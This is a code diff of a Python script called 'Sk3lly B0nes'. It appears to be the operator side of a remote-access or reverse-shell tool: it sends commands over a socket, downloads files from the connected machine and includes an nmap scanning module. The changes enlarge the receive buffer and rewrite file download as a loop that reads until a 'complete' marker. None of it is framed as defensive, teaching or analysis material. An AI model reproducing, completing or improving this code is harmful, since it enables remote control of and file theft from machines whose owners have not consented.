@@ -5,7 +5,6 @@ from colorama import Fore, Back, Style
 import notify2
 import nmap
 import requests
-import tqdm
 
 print(" _____ _    _____ _ _      ______  _____ ")
 print("/  ___| |  |____ | | |     | ___ \|  _  | ")
@@ -21,7 +20,7 @@ print("                      |___/ ")
 conf = open("skelly-bones.conf", "r+")
 conf_lines = conf.readlines()
 
-BYTES = 10000
+BYTES = 10000000
 
 ## Notification settings:
 notify2.init("Sk3lly B0nes")
@@ -83,14 +82,12 @@ def command_skeleton(conn):
 				conn.send(cmd.encode())
 				path = input("[i] File to download (include extentsion): ")
 				conn.send(path.encode())
-				file = conn.recv(10000000)
-				new_name = input("[i] Download file as (include extension): ")
-				new_file = open(new_name, "wb")
-				new_file.write(file)
-				new_file.close()
-				print("[i] " + new_name + " has been saved")
-				print("Hit ctrl + c if shell gets stuck or confuses commands")
-
+				f = open(path, 'wb')
+				file = conn.recv(BYTES)
+				while not ('complete' in str(file)):
+					f.write(file)
+					file = conn.recv(BYTES)
+				f.close()
 			else:
 				conn.send(str.encode(cmd))
 				client_response = str(conn.recv(BYTES), "utf-8")
@@ -100,7 +97,7 @@ def command_skeleton(conn):
 			print("\n" + Style.BRIGHT + Fore.BLUE + "[i] Type 'quit' to close shell" + Style.RESET_ALL)
 			continue
 		except UnicodeDecodeError:
-			print("A decoding error occured. Do not be alarmed")
+			print("A decoding error occured.")
 			continue
 
 #nmap scan module
